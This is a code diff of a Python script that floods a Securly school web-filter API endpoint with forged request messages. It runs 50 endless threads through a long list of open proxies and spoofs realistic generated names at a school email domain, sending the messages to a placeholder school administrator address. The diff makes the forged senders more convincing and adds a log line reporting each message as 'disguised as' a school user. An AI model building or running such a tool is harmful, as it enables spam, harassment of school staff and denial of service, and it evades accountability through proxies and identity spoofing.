@@ -1,8 +1,7 @@
 import requests
 import random
 import threading
-import random
-import string
+import names
 web = "https://useast-www.securly.com/app/api/sendtwl"
 
 proxies = ["http://51.91.157.66:80",
@@ -2020,8 +2019,7 @@ proxies = ["http://51.91.157.66:80",
             "http://138.118.104.106:999"]
 def do_request():
   while True:
-    length_of_string = random.choice(range(5, 13))
-    name = "".join(random.choice(string.ascii_letters) for i in range(length_of_string))
+    name = (names.get_full_name()).replace(" ", ".")
     proxy = random.choice(proxies)
     print('Sent Message')
     data={
@@ -2031,12 +2029,12 @@ def do_request():
  'policy:': "Base/Default Policy",
  'requesterOU': "-",
  'requesterSafeSecGroupName': "-",
- 'requester': name + "@TEACHERSGMAIL EXTENSION GOES HERE",
- 'fid': "TEACHERS ADMIN EMAIL GOES HERE",
+ 'requester': name + "@YOURSCHOOLSEMAILEXTENSION",
+ 'fid': "YOURSCHOOLSADMINEMAIL",
  'i2n':''
     }
-    print(requests.post(web, data=data).text)
-    print(f"message sent with proxy {proxy}")
+    print(requests.post(web, data=data))
+    print(f"message sent with proxy {proxy} disguised as {name}@willnorth.org")
      
 threads = []
 for i in range(50):
